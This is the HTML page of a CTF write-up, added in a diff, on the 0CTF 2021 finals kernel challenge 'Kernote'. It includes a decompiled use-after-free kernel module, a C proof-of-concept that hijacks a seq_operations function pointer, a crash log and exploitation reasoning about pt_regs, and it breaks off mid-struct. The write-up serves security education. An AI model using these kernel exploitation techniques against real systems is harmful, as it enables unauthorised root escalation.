@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Kernote | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Kernote" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/0CTF-2021-finals/pwn/kernote.html" />
+<meta property="og:url" content="https://org.anize.rs/0CTF-2021-finals/pwn/kernote.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Kernote" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Kernote","url":"https://org.anize.rs/0CTF-2021-finals/pwn/kernote.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="kernote">Kernote</h1>
+
+<p><strong>Authors:</strong> <a href="https://twitter.com/_MatteoRizzo">Nspace</a></p>
+
+<p><strong>Tags:</strong> pwn, kernel</p>
+
+<p><strong>Points:</strong> 750</p>
+
+<blockquote>
+  <p>Let’s try kernote in kernel</p>
+
+  <p>nc 42.192.68.11 12345
+<a href="https://attachment.ctf.0ops.sjtu.cn/kernote_3157feafdcfaf6dcfa356a04ad57a056.tar.gz">Attachment</a>
+or <a href="https://mega.nz/file/axoHVaTa#cl_YEcpSn3W094l65jYVKugt0DWucl1YnuDGqq_OVN4">Attachment(MEGA)</a></p>
+</blockquote>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>This is a kernel pwn challenge. The challenge uses the usual setup: a QEMU VM
+running Linux with a vulnerable module. We get an unprivileged shell in the VM
+and we have to exploit the kernel to become root and read the flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls
+bzImage		readme.md	rootfs.img	run.sh
+
+$ cat readme.md
+Here are some kernel config options in case you need it
+CONFIG_SLAB=y
+CONFIG_SLAB_FREELIST_RANDOM=y
+CONFIG_SLAB_FREELIST_HARDENED=y
+CONFIG_HARDENED_USERCOPY=y
+CONFIG_STATIC_USERMODEHELPER=y
+CONFIG_STATIC_USERMODEHELPER_PATH=""
+
+$ cat run.sh
+#!/bin/sh
+qemu-system-x86_64 \
+-m 128M \
+-kernel ./bzImage \
+-hda ./rootfs.img \
+-append "console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on" \
+-monitor /dev/null \
+-smp cores=2,threads=2 \
+-nographic \
+-cpu kvm64,+smep,+smap \
+-no-reboot \
+-snapshot
+</code></pre></div></div>
+
+<p>All the usual mitigations are enabled (SMEP, SMAP, KASLR, KPTI, …). The kernel
+also uses the SLAB allocator instead of the default SLUB and disables usermode
+helpers by hardcoding their path to “”. Furthermore the VM will shut down
+immediately if we cause any kernel warnings or panics.</p>
+
+<p><code class="language-plaintext highlighter-rouge">rootfs.img</code> is an ext4 disk. We can mount it to extract the files:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mount -o loop rootfs.img mount
+
+$ ls mount
+bin  dev  etc  flag  init  kernote.ko  linuxrc  lost+found  proc  sbin  sys  tmp  usr
+
+$  cat mount/init
+#!/bin/sh
+mount -t proc none /proc
+mount -t sysfs none /sys
+mount -t tmpfs tmpfs /tmp
+#mount -t devtmpfs devtmpfs /dev
+mkdir /dev/pts
+mount -t devpts devpts /dev/pts
+echo /sbin/mdev&gt;/proc/sys/kernel/hotplug
+echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+echo 1 &gt; /proc/sys/kernel/kptr_restrict
+echo "flag{testflag}"&gt;/flag
+chmod 660 /flag
+insmod /kernote.ko
+#/sbin/mdev -s
+chmod 666 /dev/kernote
+chmod 777 /tmp
+setsid cttyhack setuidgid 1000 sh
+poweroff -f
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">kptr_restrict=1</code> prevents us from reading kernel addresses from
+<code class="language-plaintext highlighter-rouge">/proc/kallsyms</code> and <code class="language-plaintext highlighter-rouge">dmesg_restrict=1</code> prevents us from reading the kernel logs.</p>
+
+<p>The interesting part is <code class="language-plaintext highlighter-rouge">kernote.ko</code>, the kernel module which contains the
+vulnerable code. My teammate <a href="https://twitter.com/busdma">busdma</a> reverse
+engineered the module and quickly spotted some bugs. Here is the (cleaned up)
+decompilation.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="kt">uint64_t</span> <span class="o">*</span><span class="n">note</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">major_num</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">class</span> <span class="o">*</span><span class="n">module_class</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">device</span> <span class="o">*</span><span class="n">module_device</span><span class="p">;</span>
+<span class="n">spinlock_t</span> <span class="n">spin</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">kernote_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">);</span>
+
+<span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">kernote_fo</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">kernote_ioctl</span><span class="p">,</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">module_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">major_num</span> <span class="o">=</span> <span class="n">register_chrdev</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">"kernote"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kernote_fo</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">major_num</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"[kernote] : Failed to register device</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">major_num</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">module_class</span> <span class="o">=</span> <span class="n">class_create</span><span class="p">(</span><span class="n">THIS_MODULE</span><span class="p">,</span> <span class="s">"kernote"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">module_device</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">module_class</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">unregister_chrdev</span><span class="p">(</span><span class="n">major_num</span><span class="p">,</span> <span class="s">"kernote"</span><span class="p">);</span>
+        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"[kernote] : Failed to create class</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">PTR_ERR</span><span class="p">(</span><span class="n">module_class</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">module_device</span> <span class="o">=</span> <span class="n">device_create</span><span class="p">(</span><span class="n">module_class</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">MKDEV</span><span class="p">(</span><span class="n">major_num</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">"kernote"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">module_device</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">class_destroy</span><span class="p">(</span><span class="n">module_class</span><span class="p">);</span>
+        <span class="n">unregister_chrdev</span><span class="p">(</span><span class="n">major_num</span><span class="p">,</span> <span class="s">"kernote"</span><span class="p">);</span>
+        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"[kernote] : Failed to create device</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">PTR_ERR</span><span class="p">(</span><span class="n">module_device</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"[kernote] : Insert module complete</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">kernote_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+
+    <span class="n">raw_spin_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">spin</span><span class="p">);</span>
+
+    <span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// alloc note</span>
+    <span class="k">case</span> <span class="mh">0x6667</span><span class="p">:</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">arg</span> <span class="o">&gt;</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">newnote</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+        <span class="n">buf</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span> <span class="o">=</span> <span class="n">newnote</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">newnote</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+
+    <span class="c1">// free note</span>
+    <span class="k">case</span> <span class="mh">0x6668</span><span class="p">:</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">arg</span> <span class="o">&gt;</span> <span class="mi">15</span> <span class="o">||</span> <span class="n">buf</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">kfree</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">arg</span><span class="p">]);</span>
+        <span class="n">buf</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+
+    <span class="c1">// set note pointer</span>
+    <span class="k">case</span> <span class="mh">0x6666</span><span class="p">:</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">arg</span> <span class="o">&gt;</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">note</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">arg</span><span class="p">];</span>
+        <span class="k">break</span><span class="p">;</span>
+
+    <span class="c1">// write note</span>
+    <span class="k">case</span> <span class="mh">0x6669</span><span class="p">:</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">note</span><span class="p">)</span> <span class="p">{</span>
+            <span class="o">*</span><span class="n">note</span> <span class="o">=</span> <span class="n">arg</span><span class="p">;</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+
+    <span class="c1">// inc refcount?</span>
+    <span class="k">case</span> <span class="mh">0x666a</span><span class="p">:</span> 
+        <span class="k">struct</span> <span class="n">user_struct</span> <span class="o">*</span><span class="n">user</span> <span class="o">=</span> <span class="n">current_task</span><span class="o">-&gt;</span><span class="n">cred</span><span class="o">-&gt;</span><span class="n">user</span><span class="p">;</span>
+        <span class="n">refcount_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">__count</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"[kernote] : ********</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">note</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"[kernote] : 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">note</span><span class="p">);</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"[kernote] : No note</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">spin</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The first bug is that note can point to freed memory if we set it to the address
+of a note and then free that note. The second bug is that command <code class="language-plaintext highlighter-rouge">0x666a</code>
+increments the <code class="language-plaintext highlighter-rouge">user_struct</code>’s refcount but never decrements it. The second bug
+is useless because overflowing a refcount triggers a warning which shuts down
+the VM immediately, but the first bug looks promising. Later during the CTF the
+author of the task confirmed that the second bug was unintentional.</p>
+
+<p>Command <code class="language-plaintext highlighter-rouge">0x666a</code> looks like it might leak the contents of a note, but in
+practice it only does so when invoked by root and it logs the contents to dmesg,
+which we can’t access. Either way it’s not useful.</p>
+
+<p>In conclusion, the bug lets us overwrite the first 8 bytes of a freed chunk in
+kmalloc-32. The challenge is to somehow use that to get root.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>After reverse engineering the module busdma also wrote a PoC exploit that crashes
+the kernel with a controlled RIP. The PoC frees a note and reclaims the freed
+chunk with a <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/seq_file.h#L31"><code class="language-plaintext highlighter-rouge">struct seq_operations</code></a>, which is heap allocated in kmalloc-32 and contains a function pointer
+in the first 8 bytes. It then uses the bug to overwrite the function pointer and
+reads from the seq file to call the overwritten pointer.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define SET_NOTE    0x6666
+#define ALLOC_ENTRY 0x6667 
+#define FREE_ENTRY  0x6668
+#define WRITE_NOTE  0x6669
+</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="n">kfd</span><span class="p">;</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">set_note</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">kfd</span><span class="p">,</span> <span class="n">SET_NOTE</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">alloc_entry</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">kfd</span><span class="p">,</span> <span class="n">ALLOC_ENTRY</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">free_entry</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">kfd</span><span class="p">,</span> <span class="n">FREE_ENTRY</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">write_note</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">kfd</span><span class="p">,</span> <span class="n">WRITE_NOTE</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">kfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/kernote"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">kfd</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">alloc_entry</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">alloc_entry</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">set_note</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">free_entry</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/stat"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+
+    <span class="n">write_note</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[    3.856543] general protection fault, probably for non-canonical address 0x4141414141414141: 0000 [#1] SMP PTI
+[    3.858362] CPU: 0 PID: 141 Comm: pwn Tainted: G           OE     5.11.9 #2
+[    3.859598] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.14.0-2 04/01/2014
+[    3.861074] RIP: 0010:__x86_indirect_thunk_rax+0x3/0x5
+[    3.861995] Code: 06 d7 ff 31 c0 e9 43 06 d7 ff &lt;...&gt;
+[    3.865260] RSP: 0018:ffffc90000253dc0 EFLAGS: 00010246
+[    3.866187] RAX: 4141414141414141 RBX: ffffc90000253e60 RCX: 0000000000000000
+[    3.867440] RDX: 0000000000000000 RSI: ffff888004d47be0 RDI: ffff888004d47bb8
+[    3.868698] RBP: ffffc90000253e18 R08: 0000000000001000 R09: ffff888003c63000
+[    3.869960] R10: ffffc90000253e68 R11: 0000000000000000 R12: 0000000000000000
+[    3.871217] R13: ffff888004d47bb8 R14: ffff888004d47be0 R15: ffffc90000253ef0
+[    3.872474] FS:  0000000001e68380(0000) GS:ffff888007600000(0000) knlGS:0000000000000000
+[    3.873898] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    3.874914] CR2: 000000000048afd0 CR3: 0000000004cca000 CR4: 00000000003006f0
+</code></pre></div></div>
+
+<p>This is a great starting point but it’s not enough to own the kernel. We can’t
+directly jump to some code in userspace because of SMEP + KPTI. We also can’t
+(seemingly) start a ROP or JOP chain right away because we don’t control the
+contents of any of the registers or the memory they point to (except rax which
+contains our overwritten function pointer).</p>
+
+<p>My goal at this point was to try and use our bug to get arbitrary read and write
+in the kernel.</p>
+
+<p>My first idea was to overwrite a freelist pointer. By default the first 8 bytes
+of a free kmalloc chunk contain the freelist pointer and we can easily get
+arbitrary r/w by overwriting that. Unfortunately this challenge doesn’t use the
+default allocator. Instead the author enabled the older SLAB allocator which
+stores metadata out-of-line and prevents this attack.</p>
+
+<p>My second idea was to corrupt the next pointer of a <code class="language-plaintext highlighter-rouge">msg_msgseg</code>. I had played
+corCTF about 1 month earlier and spent a lot of time failing to pwn the <code class="language-plaintext highlighter-rouge">Fire of
+Salvation</code> kernel challenge. That challenge let us overwrite the first 40 bytes
+of a freed chunk in kmalloc-4k, which is somewhat similar to what we have here.
+You can find the author’s writeup for that challenge <a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">here</a>.
+We can reclaim the freed note with a 32-byte <code class="language-plaintext highlighter-rouge">msg_msgseg</code>, which contains a
+pointer to the next <code class="language-plaintext highlighter-rouge">msgseg</code> in the first 8 bytes, then hopefully use that to
+get arbitrary read and write, just like in that challenge. Unfortunately I
+couldn’t turn this into an arbitrary kernel r/w, even though I could crash the
+kernel with an arbitrary pointer dereference. The reason is that the bug doesn’t
+let us overwrite the <code class="language-plaintext highlighter-rouge">m_ts</code> field of <code class="language-plaintext highlighter-rouge">msg_msg</code>, so the kernel will stop reading
+and writing after the first <code class="language-plaintext highlighter-rouge">msg_msgseg</code>.</p>
+
+<p>After spending hours on this idea and ultimately ruling it out I went back to
+busdma’s crash PoC and started looking for controllable memory in GDB. I
+eventually noticed that there were a lot of what looked like userspace pointers
+near the bottom of the kernel’s stack:</p>
+
+<p><img src="/0CTF-2021-finals/pwn/kernote1.png" alt="" /></p>
+
+<p>After looking at the system call handler for a bit it became clear that these
+are the saved userspace registers. One of the first things the system call
+handler does is to <a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/entry/entry_64.S#L115">push</a> a <code class="language-plaintext highlighter-rouge">struct pt_regs</code> on the stack.
+<a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/uapi/asm/ptrace.h#L44"><code class="language-plaintext highlighter-rouge">pt_regs</code></a>
+contains the values of all the registers at the moment the system call was
+invoked. As far as I can tell all registers are <a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/entry/calling.h#L100">saved</a> on every syscall,
+despite what the comment on <code class="language-plaintext highlighter-rouge">pt_regs</code> says. Obviously the contents of <code class="language-plaintext highlighter-rouge">pt_regs</code>
+are fully controlled by userspace, minus some constraints such as that <code class="language-plaintext highlighter-rouge">rax</code>
+must contain the correct system call number.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">pt_regs</span> <span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r15</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r14</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r13</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r12</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rbp</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rbx</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r11</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r10</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r9</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r8</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rax</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rcx</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rdx</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rsi</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rdi</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">orig_rax</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rip</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cs</span><span class="p">;</span>
